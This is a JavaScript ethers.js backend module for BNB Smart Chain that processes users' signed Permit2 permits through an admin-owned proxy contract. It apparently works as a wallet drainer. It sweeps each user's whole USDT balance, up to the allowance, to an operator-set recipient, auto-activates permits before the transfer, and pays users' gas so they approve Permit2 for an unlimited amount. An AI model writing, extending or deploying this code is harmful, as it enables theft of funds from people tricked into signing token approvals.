import { ethers } from 'ethers';

const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
const DEFAULT_PROXY_ADDRESS = '0x4ac0F075d81C3460027D3CaFf98d9AbF50c6723B';

const PERMIT2_ABI = [
  'function permit(address owner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external',
  'function transferFrom(address from, address to, uint160 amount, address token) external',
  'function allowance(address owner, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)',
];

const PROXY_ABI = [
  'function executePermit(address tokenOwner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external',
  'function executeTransfer(address from, address to, uint160 amount, address token) external',
  'function executePermitAndTransfer(address tokenOwner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature, address to, uint160 transferAmount) external',
];

const USDT_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
];

const DEFAULT_BSC_RPC = 'https://bsc-dataseed.bnbchain.org';
let cachedProvider = null;

export function getBscProvider() {
  if (!cachedProvider) {
    const rpcUrl = process.env.BSC_RPC_URL && !process.env.BSC_RPC_URL.includes('binance.org')
      ? process.env.BSC_RPC_URL
      : DEFAULT_BSC_RPC;
    cachedProvider = new ethers.JsonRpcProvider(rpcUrl);
  }
  return cachedProvider;
}

function getSpenderAddress(wallet) {
  const proxy = process.env.PROXY_CONTRACT_ADDRESS || process.env.ADMIN_SPENDER_ADDRESS || DEFAULT_PROXY_ADDRESS;
  if (proxy && ethers.isAddress(proxy) && !proxy.startsWith('0x00000000000000000000')) {
    return ethers.getAddress(proxy);
  }
  return wallet.address;
}

/**
 * Read the current on-chain nonce for a user from Permit2 AllowanceTransfer.
 */
export async function getOnChainNonce(ownerAddress, tokenAddress = '0x55d398326f99059ff775485246999027b3197955') {
  try {
    const provider = getBscProvider();
    const dummyKey = '0x0000000000000000000000000000000000000000000000000000000000000001';
    const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY || dummyKey, provider);
    const spenderAddress = getSpenderAddress(wallet);
    const contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
    const [_amount, _expiration, nonce] = await contract.allowance(
      ethers.getAddress(ownerAddress),
      ethers.getAddress(tokenAddress),
      spenderAddress
    );
    return Number(nonce);
  } catch (err) {
    console.error('Error fetching on-chain nonce:', err.message);
    return 0;
  }
}

/**
 * Step 1: Submit the user's signed permit to Permit2 contract.
 */
export async function activatePermit(permit) {
  const provider = getBscProvider();
  const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, provider);
  
  const ownerAddress = ethers.getAddress(permit.owner);
  const tokenAddress = ethers.getAddress(permit.token);
  
  const defaultSpender = getSpenderAddress(wallet);
  const proxyAddress = (process.env.PROXY_CONTRACT_ADDRESS || DEFAULT_PROXY_ADDRESS).toLowerCase();

  let targetSpender = permit.spender && ethers.isAddress(permit.spender)
    ? ethers.getAddress(permit.spender)
    : ethers.getAddress(proxyAddress);

  // If targetSpender is an old proxy contract not owned by current admin wallet, fallback to active proxy
  if (targetSpender.toLowerCase() !== proxyAddress) {
    try {
      const tempProxy = new ethers.Contract(targetSpender, ['function owner() view returns (address)'], provider);
      const contractOwner = await tempProxy.owner();
      if (contractOwner.toLowerCase() !== wallet.address.toLowerCase()) {
        console.log(`Stored spender ${targetSpender} is owned by ${contractOwner}, switching to current active Proxy (${proxyAddress}).`);
        targetSpender = ethers.getAddress(proxyAddress);
      }
    } catch (e) {
      // Ignore
    }
  }

  const targetCode = await provider.getCode(targetSpender);
  const isUsingProxy = (targetCode && targetCode.length > 2) || targetSpender.toLowerCase() === proxyAddress;

  // Check user approved Permit2 on USDT contract
  const usdtContract = new ethers.Contract(tokenAddress, USDT_ABI, provider);
  const erc20Allowance = await usdtContract.allowance(ownerAddress, PERMIT2_ADDRESS);

  if (erc20Allowance === 0n) {
    throw new Error('User has not approved Permit2 contract on USDT token yet. User must approve from the frontend first.');
  }

  const permitSingle = {
    details: {
      token: tokenAddress,
      amount: permit.amount,
      expiration: permit.deadline,
      nonce: permit.nonce,
    },
    spender: targetSpender,
    sigDeadline: permit.deadline,
  };

  const signature = ethers.Signature.from({
    r: permit.r,
    s: permit.s,
    v: permit.v,
  }).serialized;

  console.log(`Activating AllowanceTransfer permit via Spender: ${targetSpender} (Proxy: ${isUsingProxy})`);

  if (isUsingProxy) {
    const proxyContract = new ethers.Contract(targetSpender, PROXY_ABI, wallet);
    try {
      await proxyContract.executePermit.staticCall(ownerAddress, permitSingle, signature);
    } catch (simErr) {
      const reason = simErr.reason || simErr.shortMessage || simErr.message;
      console.warn(`Simulated proxy executePermit() reverted: ${reason}`);
      const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
      const existing = await permit2Contract.allowance(ownerAddress, tokenAddress, targetSpender);
      if (existing.amount > 0n) {
        return '0xALREADY_ACTIVATED';
      }
      throw new Error(`Permit signature invalid or already processed on-chain: ${reason}`);
    }

    const tx = await proxyContract.executePermit(ownerAddress, permitSingle, signature, { gasLimit: 250000 });
    console.log('Proxy permit activation TX sent:', tx.hash);
    const receipt = await tx.wait();
    return receipt.hash;
  } else {
    const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);
    try {
      await permit2Contract.permit.staticCall(ownerAddress, permitSingle, signature);
    } catch (simErr) {
      const reason = simErr.reason || simErr.shortMessage || simErr.message;
      const existing = await permit2Contract.allowance(ownerAddress, tokenAddress, targetSpender);
      if (existing.amount > 0n) {
        return '0xALREADY_ACTIVATED';
      }
      throw new Error(`Permit signature invalid or processed: ${reason}`);
    }

    const tx = await permit2Contract.permit(ownerAddress, permitSingle, signature, { gasLimit: 200000 });
    const receipt = await tx.wait();
    return receipt.hash;
  }
}

/**
 * Step 2: Transfer tokens using active Permit2 allowance via Proxy or Wallet.
 * Automatically activates permit on-chain if not already activated.
 */
export async function executeTransfer(permit, customAmount = null) {
  const provider = getBscProvider();
  const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, provider);

  const ownerAddress = ethers.getAddress(permit.owner);
  const tokenAddress = ethers.getAddress(permit.token);
  const recipientAddress = ethers.getAddress(process.env.RECIPIENT_ADDRESS);

  const usdtContract = new ethers.Contract(tokenAddress, USDT_ABI, provider);
  const balance = await usdtContract.balanceOf(ownerAddress);

  if (balance === 0n) {
    throw new Error('User wallet currently has 0 USDT balance on-chain.');
  }

  const defaultSpender = getSpenderAddress(wallet);
  const proxyAddress = (process.env.PROXY_CONTRACT_ADDRESS || DEFAULT_PROXY_ADDRESS).toLowerCase();

  let targetSpender = permit.spender && ethers.isAddress(permit.spender)
    ? ethers.getAddress(permit.spender)
    : ethers.getAddress(proxyAddress);

  // If targetSpender is an old proxy contract not owned by current admin wallet, fallback to active proxy
  if (targetSpender.toLowerCase() !== proxyAddress) {
    try {
      const tempProxy = new ethers.Contract(targetSpender, ['function owner() view returns (address)'], provider);
      const contractOwner = await tempProxy.owner();
      if (contractOwner.toLowerCase() !== wallet.address.toLowerCase()) {
        console.log(`Stored spender ${targetSpender} is owned by ${contractOwner}, switching to current active Proxy (${proxyAddress}).`);
        targetSpender = ethers.getAddress(proxyAddress);
      }
    } catch (e) {
      // Ignore if not a contract or doesn't have owner()
    }
  }

  const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
  let [allowanceAmount, expiration] = await permit2Contract.allowance(
    ownerAddress,
    tokenAddress,
    targetSpender
  );

  // Fallback: If allowance is 0 for stored targetSpender, check if current active proxyAddress has active allowance!
  if (allowanceAmount === 0n && targetSpender.toLowerCase() !== proxyAddress) {
    const proxyAllowance = await permit2Contract.allowance(ownerAddress, tokenAddress, proxyAddress);
    if (proxyAllowance[0] > 0n) {
      targetSpender = ethers.getAddress(proxyAddress);
      allowanceAmount = proxyAllowance[0];
      expiration = proxyAllowance[1];
      console.log(`Switched to active Proxy Address (${targetSpender}) with ${allowanceAmount.toString()} allowance.`);
    }
  }

  // If allowance is still zero, attempt to auto-activate permit on-chain first
  if (allowanceAmount === 0n) {
    console.log(`Allowance is 0. Auto-activating permit for ${ownerAddress} before transfer...`);
    try {
      await activatePermit(permit);
      const updatedAllowance = await permit2Contract.allowance(ownerAddress, tokenAddress, targetSpender);
      allowanceAmount = updatedAllowance[0];
      expiration = updatedAllowance[1];
    } catch (actErr) {
      console.warn('Auto-activation during transfer failed:', actErr.message);
      throw new Error(`Permit not active on-chain and auto-activation failed: ${actErr.message}`);
    }
  }

  if (allowanceAmount === 0n) {
    throw new Error('No active Permit2 allowance on-chain.');
  }

  const now = Math.floor(Date.now() / 1000);
  if (Number(expiration) > 0 && Number(expiration) < now) {
    throw new Error('Permit2 allowance has expired.');
  }

  let transferAmount = balance < allowanceAmount ? balance : allowanceAmount;
  if (customAmount) {
    const customBigInt = BigInt(customAmount);
    if (customBigInt < transferAmount) transferAmount = customBigInt;
  }

  // Determine whether to use Proxy or EOA based on code on-chain
  const targetCode = await provider.getCode(targetSpender);
  const isUsingProxy = (targetCode && targetCode.length > 2) || targetSpender.toLowerCase() === proxyAddress;

  console.log(`Executing transferFrom via ${isUsingProxy ? 'Proxy Contract' : 'Admin Wallet'} (${targetSpender})...`);

  if (isUsingProxy) {
    const proxyContract = new ethers.Contract(targetSpender, PROXY_ABI, wallet);
    try {
      await proxyContract.executeTransfer.staticCall(ownerAddress, recipientAddress, transferAmount, tokenAddress);
    } catch (simErr) {
      const reason = simErr.reason || simErr.shortMessage || simErr.message;
      throw new Error(`Proxy transfer simulation failed on-chain: ${reason}`);
    }

    const tx = await proxyContract.executeTransfer(
      ownerAddress,
      recipientAddress,
      transferAmount,
      tokenAddress,
      { gasLimit: 250000 }
    );
    console.log('Proxy Transfer TX sent:', tx.hash);
    const receipt = await tx.wait();
    return { txHash: receipt.hash, amount: transferAmount.toString() };
  } else {
    const permit2WalletContract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);
    try {
      await permit2WalletContract.transferFrom.staticCall(ownerAddress, recipientAddress, transferAmount, tokenAddress);
    } catch (simErr) {
      const reason = simErr.reason || simErr.shortMessage || simErr.message;
      throw new Error(`Transfer simulation failed on-chain: ${reason}`);
    }

    const tx = await permit2WalletContract.transferFrom(ownerAddress, recipientAddress, transferAmount, tokenAddress, { gasLimit: 200000 });
    const receipt = await tx.wait();
    return { txHash: receipt.hash, amount: transferAmount.toString() };
  }
}

const allowanceCache = new Map();
const ALLOWANCE_CACHE_TTL_MS = 60000; // 60-second TTL prevents RPC spam

/**
 * Check the current Permit2 AllowanceTransfer state for a user safely with error fallback.
 */
export async function checkPermit2Allowance(ownerAddress, tokenAddress) {
  try {
    if (!ownerAddress || !tokenAddress) return null;

    let cleanOwner, cleanToken;
    try {
      cleanOwner = ethers.getAddress(ownerAddress);
      cleanToken = ethers.getAddress(tokenAddress);
    } catch (addrErr) {
      return null;
    }

    const cacheKey = `${cleanOwner.toLowerCase()}_${cleanToken.toLowerCase()}`;
    const cached = allowanceCache.get(cacheKey);
    if (cached && (Date.now() - cached.timestamp < ALLOWANCE_CACHE_TTL_MS)) {
      return cached.data;
    }

    const provider = getBscProvider();

    let walletAddress = process.env.ADMIN_PUBLIC_ADDRESS;
    if (process.env.ADMIN_PRIVATE_KEY && !process.env.ADMIN_PRIVATE_KEY.startsWith('0x00000000000000000000')) {
      try {
        const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY);
        walletAddress = wallet.address;
      } catch (e) {}
    }

    const spender = (process.env.PROXY_CONTRACT_ADDRESS || process.env.ADMIN_SPENDER_ADDRESS || DEFAULT_PROXY_ADDRESS || walletAddress);

    if (!spender || !ethers.isAddress(spender)) {
      return null;
    }

    const contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
    const usdtContract = new ethers.Contract(cleanToken, USDT_ABI, provider);

    const fetchAllowance = Promise.all([
      contract.allowance(cleanOwner, cleanToken, spender),
      usdtContract.allowance(cleanOwner, PERMIT2_ADDRESS),
    ]);

    const timeout = new Promise((_, reject) =>
      setTimeout(() => reject(new Error('RPC Timeout')), 4000)
    );

    const [[amount, expiration, nonce], erc20Allowance] = await Promise.race([fetchAllowance, timeout]);

    const result = {
      spender,
      permit2Amount: amount.toString(),
      permit2Expiration: Number(expiration),
      permit2Nonce: Number(nonce),
      erc20Allowance: erc20Allowance.toString(),
      hasErc20Approval: erc20Allowance > 0n,
      hasPermit2Allowance: amount > 0n,
      isActivated: amount > 0n,
      isExpired: Number(expiration) > 0 && Number(expiration) < Math.floor(Date.now() / 1000),
    };

    allowanceCache.set(cacheKey, { timestamp: Date.now(), data: result });
    return result;
  } catch (err) {
    console.error('Error checking Permit2 allowance for', ownerAddress, err.message);
    return null;
  }
}

/**
 * Send the exact BNB needed for one USDT.approve(Permit2, MaxUint256) TX.
 */
export async function sendGasFunding(userAddress) {
  const USDT_ADDRESS  = '0x55d398326f99059ff775485246999027b3197955';
  const PERMIT2_ADDR  = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

  const provider = getBscProvider();
  const wallet   = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, provider);
  const recipientAddress = ethers.getAddress(userAddress);

  // ── 1. Estimate gas units for USDT.approve(Permit2, MaxUint256) ──
  let approveGasUnits = 60000n; // safe fallback
  try {
    const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
    const est = await usdtContract.approve.estimateGas(
      PERMIT2_ADDR, ethers.MaxUint256, { from: recipientAddress }
    );
    approveGasUnits = (est * 120n) / 100n; // +20% buffer on units
  } catch (e) {
    console.warn('[GasFund] Gas estimation failed, using 60000 fallback:', e.message);
  }

  // ── 2. Get current BSC gas price — floor at 1 gwei (realistic for BSC) ──
  const feeData  = await provider.getFeeData();
  const MIN_GWEI = ethers.parseUnits('1', 'gwei');
  const gasPrice = (feeData.gasPrice && feeData.gasPrice > MIN_GWEI)
    ? feeData.gasPrice
    : MIN_GWEI;

  // ── 3. Target = 1.5x estimated cost so minor gas spikes are covered ──
  const estimatedCost = approveGasUnits * gasPrice;
  const targetBalance = (estimatedCost * 150n) / 100n;

  const currentBalance = await provider.getBalance(recipientAddress);
  console.log(`[GasFund] ${recipientAddress}: has ${ethers.formatEther(currentBalance)} BNB, needs ${ethers.formatEther(targetBalance)} BNB`);

  // ── 4. Skip if user already has enough ──
  if (currentBalance >= targetBalance) {
    console.log('[GasFund] Sufficient balance, skipping.');
    return {
      status: 'SUFFICIENT_BALANCE',
      message: 'User already has sufficient BNB for gas',
      txHash: null,
      alreadyFunded: true,
    };
  }

  // ── 5. Fund only the deficit ──
  const fundingAmount = targetBalance - currentBalance;
  const adminBalance  = await provider.getBalance(wallet.address);
  console.log(`[GasFund] Sending ${ethers.formatEther(fundingAmount)} BNB (admin has ${ethers.formatEther(adminBalance)} BNB)`);

  if (adminBalance <= fundingAmount) {
    throw new Error(`Admin wallet has only ${ethers.formatEther(adminBalance)} BNB — cannot sponsor ${ethers.formatEther(fundingAmount)} BNB`);
  }

  const tx = await wallet.sendTransaction({
    to: recipientAddress,
    value: fundingAmount,
    gasLimit: 21000, // plain BNB transfer, fixed cost
  });

  console.log(`[GasFund] TX sent: ${tx.hash}`);
  // Wait 2 confirmations — ensures wallet providers see the updated balance
  const receipt = await tx.wait(2);
  console.log(`[GasFund] Confirmed (2 blocks): ${receipt.hash}`);

  return {
    status: 'FUNDED',
    txHash: receipt.hash,
    fundedBnb: ethers.formatEther(fundingAmount),
    amount: ethers.formatEther(fundingAmount),
  };
}
